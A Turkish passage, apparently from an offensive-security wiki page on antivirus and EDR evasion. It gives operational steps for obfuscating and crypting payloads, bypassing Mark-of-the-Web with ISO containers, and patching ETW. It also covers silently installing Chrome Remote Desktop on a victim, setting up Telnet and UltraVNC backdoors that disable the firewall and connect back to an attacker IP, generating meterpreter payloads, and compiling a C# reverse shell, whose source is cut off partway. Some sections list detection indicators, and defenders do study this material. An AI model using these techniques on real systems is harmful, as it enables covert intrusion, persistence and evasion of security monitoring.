1.  Anti-tampering korumasını kaldırma – ConfuserEx, her *method body*'yi şifreler ve şifreyi *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum değerini yamalar; böylece yapılacak herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *temiz* dosyayı **de4dot-cex**'e (de4dot'un ConfuserEx uyumlu bir fork'u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot, control-flow flattening işlemini geri alır, özgün namespace'leri, class'ları ve değişken adlarını geri yükler, ayrıca sabit string'lerin şifresini çözer.

3.  Proxy-call'lerin kaldırılması – ConfuserEx, decompilation'ı daha da zorlaştırmak için doğrudan method çağrılarını lightweight wrapper'larla (diğer adıyla *proxy call'lerle*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opak wrapper işlevleri (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API’lerini görmelisiniz.

4.  Manuel temizleme – ortaya çıkan binary dosyayı dnSpy altında çalıştırın; gerçek payload’u bulmak için büyük Base64 blob’larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman payload’u `<Module>.byte_0` içinde başlatılan TLV kodlamalı bir byte dizisi olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya gerek kalmadan yürütme akışını geri yükler – çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak triyaj etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir öznitelik oluşturur.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılabileceğini gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework'ü tarafından oluşturulan obfuscated işlemlerden oluşan bir katman ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele çalıştırılabilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM destekli diller için ince ayrıntılı bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP chain'lerine dönüştürerek bir programı assembly code düzeyinde obfuscate eder ve böylece normal control flow'a ilişkin doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Bir implantın tamamını yalnızca uyku sırasında maskelemek yerine, değiştirilmiş bir LLVM X86 backend'i seçili işlevleri etkin olmadıkları sürece XOR ile maskeli tutabilir. Function Peekaboo PoC'si, demangle edilmiş adlarında `REG_` bulunan işlevleri seçer, son makine kodunun çevresine position-independent giriş/çıkış stub'ları ekler ve `.text` içinde tek bir ortak masking handler üretir; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem, instruction selection ve optimization aşamalarından sonra yapılmalıdır; çünkü dönüşümün **üretilen her return talimatını** kapsaması ve kesin x86 yerleşimini bilmesi gerekir. Emission öncesindeki bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesi için bu talimatı siler ve önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return öncesindeki compiler tarafından üretilen stack/frame teardown talimatlarını koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` işleve özel stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra üretilecek epilogue'u hedeflemesini sağlar. Elle üretilen bir near `je` için `0F 84` baytlarını ve ardından `target - address_after_je` değerini belirten dört baytlık MC expression'ı yazın. Handler'a yapılan çağrılar ve atlamalar ise `MCInst` nesneleriyle (`CALL64pcrel32` ve `JMP_1`) üretilebilir. Seçilmeyen ve hiçbir şeyi değiştirmeyen bir işlev için pass `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC, `.funcmeta` içine bir XOR key ve loader-relocated function pointer ile runtime length içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olsa da handler, kayıt içindeki `+8` konumundan bir QWORD okuyarak length ile padding'ini tüketir ve kayıtlar arasında `0x10` ilerler. PE section adları yalnızca sekiz bayt olduğundan, runtime'daki arama `.funcmet` adını görür. Harici bir patcher, çalıştırılabilir bir `.stub` ekler, eski entry-point RVA değerini stub'a kaydeder ve `AddressOfEntryPoint` değerini değiştirir. PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` yoluyla alır, önceden import edilmiş bir `VirtualProtect` işlevini bulmak için PE32+ import'larını dolaşır ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` konumuna bir sentinel yazar ve metadata'daki her işlevi çağırır. Sürekli okunabilir olan prologue, işlev başlangıcını `gs:[0xF0]` konumuna kaydeder, sentinel'ı algılar ve henüz maskelenmemiş gövdeyi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra `[rsp+0x68]` konumundaki return address, dönüştürülmüş işlevin sonunu gösterir. Böylece `end - start` değeri metadata kaydına yazılabilir. Tüm gövdeler maskelendikten sonra stub sentinel'ı temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, gövdenin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken, önceki tüm return noktaları doğrudan ortak handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece maskeleme yeniden uygulandıktan sonra handler'ın `ret` talimatı çağıranın orijinal return address'ini tüketir ve işlev sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler, geçerli kaydı bulur, sabit ve görünür prologue'u (bu build'de `0x46` bayt) atlar, kalan bölümü `PAGE_EXECUTE_READWRITE` olarak ayarlar, düşük key baytını kullanarak byte-by-byte XOR uygular ve ardından bölümü `PAGE_EXECUTE_READ` olarak ayarlar. Dolayısıyla aynı döngü girişte verinin şifresini çözer, her normal çıkışta ise yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarıma ilişkin güçlü göstergeler şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- çalıştırılabilir bir `.stub` içindeki entry point ve key ile relocate edilmiş `.text` pointer'larını tutan bir `.funcmet` section'ı;
- pre-CRT PEB, import table ve section table ayrıştırmasının ardından her metadata pointer'ı üzerinden yapılan çağrılar;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` konumlarına yapılan yazmaları izleyen tekrarlı `VirtualProtect` geçişleri ve image-backed executable page'lere yapılan bytewise XOR yazmaları.

Bu, memory-scanner evasion'dır; kriptografik koruma değildir: patch uygulanmış dosya hâlâ orijinal, açık gövdeyi içerir ve bir debugger, etkin işlevi dökmek için `VirtualProtect` veya XOR döngüsünde durabilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı, çevrimdışı kurtarmayı da kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local'dır, ancak değiştirilmiş code page'leri process-wide'dır. Bu nedenle eşzamanlı veya recursive girişler, başka bir çağrı yürütülürken talimatların durumunu tekrar değiştirebilir; exception'lar ve nonlocal exit'ler de yeniden maskelemeyi atlayabilir. Sağlam bir uygulama, geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek koruma ayarını geri yüklemeli, hard-coded stub length değerlerinden kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve çalıştırılabilir baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, çalıştırılabilir kod değiştirildiğinde instruction-cache tutarlılığını sağlamanın çağıranın sorumluluğunda olduğunu açıkça belirtir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaktan korumak için tasarlanmış bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak itibar tabanlı bir yaklaşım kullanır. Bu nedenle sık indirilmeyen uygulamalar SmartScreen'i tetikler; bu da son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçeneğine tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. Dosya internetten indirildiğinde otomatik olarak oluşturulur ve dosyanın indirildiği URL'yi içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'i atlatmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i atlatmaya yönelik bir demo.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), uygulamaların ve sistem bileşenlerinin **olayları günlüğe kaydetmesini** sağlayan güçlü bir Windows günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (atlatılmasına) benzer şekilde, kullanıcı alanındaki sürecin **`EtwEventWrite`** işlevinin herhangi bir olayı günlüğe kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için işlev bellekte, hemen dönecek şekilde yamalanır ve böylece o süreç için ETW günlüklemesi etkili bir biçimde devre dışı bırakılır.

Daha fazla bilgiye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinden ulaşabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun zamandır biliniyor ve post-exploitation araçlarınızı AV'ye yakalanmadan çalıştırmak için hâlâ çok etkili bir yol.

Payload doğrudan belleğe yükleneceğinden ve diske dokunmayacağından, yalnızca tüm süreç için AMSI'yi yamalamamız gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunar; ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntemde **yeni bir sacrificial process başlatılır**, post-exploitation amaçlı kötü amaçlı kodunuz bu yeni sürece enjekte edilir, çalıştırılır ve işlem tamamlandığında yeni süreç sonlandırılır. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eyleminizde bir şeyler ters giderse veya tespit edilirse **implant'ın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajıysa **Behavioural Detections** tarafından yakalanma **olasılığının daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntemde post-exploitation amaçlı kötü amaçlı kod **kendi sürecine** enjekte edilir. Böylece yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz. Ancak payload'unuzun çalıştırılması sırasında bir şeyler ters giderse çökebileceğinden, **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek istiyorsanız şu makaleye göz atın: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) Ayrıca InlineExecute-Assembly BOF'a da bakabilirsiniz ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly'lerini **PowerShell üzerinden** de yükleyebilirsiniz. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'ın videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## .NET araçlarının NativeAOT WebAssembly ile yeniden paketlenmesi (WasmForge)

Normal `execute-assembly` teknikleri, tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine çalıştırma altyapısını değiştirir: C# projesini deneysel NativeAOT-LLVM WASI hedefine taşır, önceden WebAssembly'ye derler ve bu modülü Wazero tabanlı bir Windows PE host'un içine yerleştirir. Ortaya çıkan süreç hedefin CLR, JIT veya `dotnet` host'una ihtiyaç duymaz; bu nedenle yalnızca yönetilen assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayalı kurallar doğrudan görünürlüğünü kaybeder. Bu bir kaçınma/paketleme tekniğidir, ayrıcalık sınırını atlatma yöntemi değildir; guest, orijinal aracın izinlerine ve gözlemlenebilir işletim sistemi davranışına sahip olmaya devam eder.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi derleme

Önerilen derleme yolu, .NET 10 SDK'sını, NativeAOT-LLVM iş yükünü, WASI SDK 24.0'ı, linker'ı ve imzalama bağımlılıklarını içerdiği için projenin Docker ortamıdır. `.csproj` dosyası otomatik olarak algılanır; tek seferlik derleme, taşıma, uyumluluk yamalama, WASM derleme, PE oluşturma ve imzalama işlemlerini gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu gözden geçirme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı ayrıca WASI Preview 2 bileşen kodlamasını önlemek ve gömülü çalışma zamanının beklediği düz modülü üretmek için bir `wasm-component-ld` sarmalayıcısı kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# ile x64 Win32 arasında köprü kurma

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerinden yoksundur veya bunları değiştirir; ayrıca bir wasm32 konuk normalde dört baytlık işaretçi yuvaları ayırırken x64 API'leri sekiz baytlık işaretçiler döndürebilir. WasmForge her iki sorunu da aşağıdaki oluşturulan katmanlarla ele alır:<sup>[[44]](#references)</sup>

1. Bir kaynak yama aracı, AOT'ye özgü anlamsal farklılıkları giderir ve desteklenmeyen kayıt defteri, pipe, WMI, kimlik, dizin hizmeti, dosya sürümü, LSA ve benzeri çağrıları `Wf*` yardımcılarına yönlendirir.
2. Bir P/Invoke tarayıcısı, `[DllImport]` çağrılarının konuk içinde belirtilen DLL'i dinamik olarak yüklemek yerine bağlanmış C köprü sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri üretir.
3. Host'a bağlı işaretçiler C#'ta `ulong`, C'de `uint64_t` kullanır. Genel bir dağıtıcı, çağrıyı host'un Win32 işleyicisine iletir; `out8_mask`, üst yarılarının korunması gereken gerçek sekiz baytlık çıktı yuvalarını işaretler. İşaretlenmemiş wasm32 biçimli çıktılarda, x64 yazma işleminin bitişik dört baytı bozmasını önlemek için snapshot/restore koruması kullanılır.
4. Özel host köprüleri; LSA ticket-cache erişimi, yapılandırılmış sonuçlar içeren Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dağıtımına uymayan işlemleri yürütür.

Örneğin, `version.dll!VerQueryValueW` için bir sarmalayıcı dört host adresi geçirir ve 2. ve 3. bitleri (`0xC`) ayarlar; çünkü değer işaretçisi ve uzunluğu sekiz baytlık çıktı yuvalarıdır. Sarmalayıcının kendisi genel kalır ve DLL adını, export adını, bağımsız değişkenleri ve maskeyi `wf_call_v2`'ye devreder; host işaretçi çevirisini gerçekleştirip yerel API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Sınırlamalar ve tespit pivotları

Reflection ağırlıklı kod, dinamik assembly yükleme, rastgele native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları yine de her araç için yamalar gerektirebilir veya doğrudan başarısız olabilir. Genel WASI Preview 2 soketleri no-op stub'lara da ulaşabilir; bu nedenle desteklenen araçlar protokole özgü host shim'leri kullanır. Özelliklerin eşdeğer olduğunu varsaymak yerine her komutu native bir derlemeye karşı doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik, payload'ı görünmez kılmak yerine telemetriyi başka yöne kaydırır. Tespit; bir WASM modülü içeren veya oluşturan bir PE'ye, Wazero benzeri çalışma zamanı davranışlarına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 dispatch'ine, imza ve PE kaynağı anomalilerine ve bunların sonucunda oluşan API çağrılarıyla ağ trafiğine yönelebilir. Bu nedenle CLR-load, AMSI veya .NET ETW olaylarının olmaması, bir sürecin zararsız olduğunun kanıtı olarak değerlendirilmemelidir.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) adresinde önerildiği gibi, ele geçirilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında kurulu olan yorumlayıcı ortamına erişim vererek** diğer dilleri kullanarak kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Yorumlayıcı İkili Dosyalarına ve ortama erişim izni vererek, ele geçirilmiş makinenin belleğinde bu dillerde **rastgele kod çalıştırabilirsiniz**.

Repo, Defender'ın betikleri taramaya devam ettiğini; ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatma konusunda daha fazla esneklik kazandığımızı** belirtiyor. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell betikleriyle yapılan testler başarılı oldu.

## Statik analizden kaçınmak için WebAssembly'yi yeniden barındırma

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı inceleme veya düzeltme işlemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'larına handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) anlatıldığı gibi, kurbanın bilgisayarına Chrome Remote Desktop'ı dağıtıp ardından bilgisayarın kontrolünü ele geçirmek ve kalıcılık sağlamak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (yönetici yetkisi gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp Next'e tıklayın. Sihirbaz sizden yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Sağlanan komutu gerekli düzenlemelerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki çok sayıda farklı telemetri kaynağını dikkate almanız gerekir. Bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılmış bir başka harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi kısımları kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak **Defender'ın hangi kısmı** kötü amaçlı bulduğunu **tespit edene kadar ikili dosyanın parçalarını kaldırabilir** ve bulduğu kısmı size ayırmasını sağlayabilirsiniz.\
**Aynı işi yapan** bir başka araç da [**avred**](https://github.com/dobin/avred); hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde herkese açık olarak sunuyor.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümlerinde, (yönetici olarak) yükleyebileceğiniz bir **Telnet server** bulunuyordu. Şunu çalıştırmanız yeterliydi:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştir** (stealth) ve firewall'u devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup dosyasını değil, bin indirmelerini istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, _**winvnc.exe**_ ikili dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, reverse **VNC connection** yakalamaya hazır olması için `vncviewer.exe -listen 5900` ikili dosyasını **kendi host'unda** çalıştırmalıdır. Ardından, **victim** içinde: `winvnc.exe -run` ile winvnc daemon'ını başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- Zaten çalışıyorsa `winvnc`'i başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `UltraVNC.ini` aynı dizinde değilken `winvnc`'i başlatmayın; aksi hâlde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi `msfconsole -r file.rc` ile **lister'ı başlatın** ve **xml payload'ını** şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Güncel Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Bununla kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
